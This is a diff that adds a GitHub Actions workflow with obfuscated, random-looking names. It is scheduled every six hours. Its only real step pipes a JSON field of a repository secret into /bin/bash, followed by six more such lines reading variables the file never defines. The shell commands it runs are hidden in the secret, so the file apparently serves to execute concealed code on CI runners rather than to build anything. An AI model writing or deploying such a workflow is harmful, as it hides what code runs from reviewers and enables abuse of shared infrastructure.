@@ -1,0 +1,23 @@
+name: lihunzheng4718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lihunzheng4718
+        env:
+          kq89: ${{ secrets.kq89 }}
+        run: |
+          echo $kq89 | jq -r .e458 | /bin/bash
+          echo $ivnch6 | jq -r .xdoy18 | /bin/bash
+          echo $ybpx33439 | jq -r .c97 | /bin/bash
+          echo $evwg5062 | jq -r .tl3447 | /bin/bash
+          echo $xbk88020 | jq -r .yjfjm4392 | /bin/bash
+          echo $clqi7 | jq -r .lx060 | /bin/bash
+          echo $k3021 | jq -r .sqd5227 | /bin/bash
+
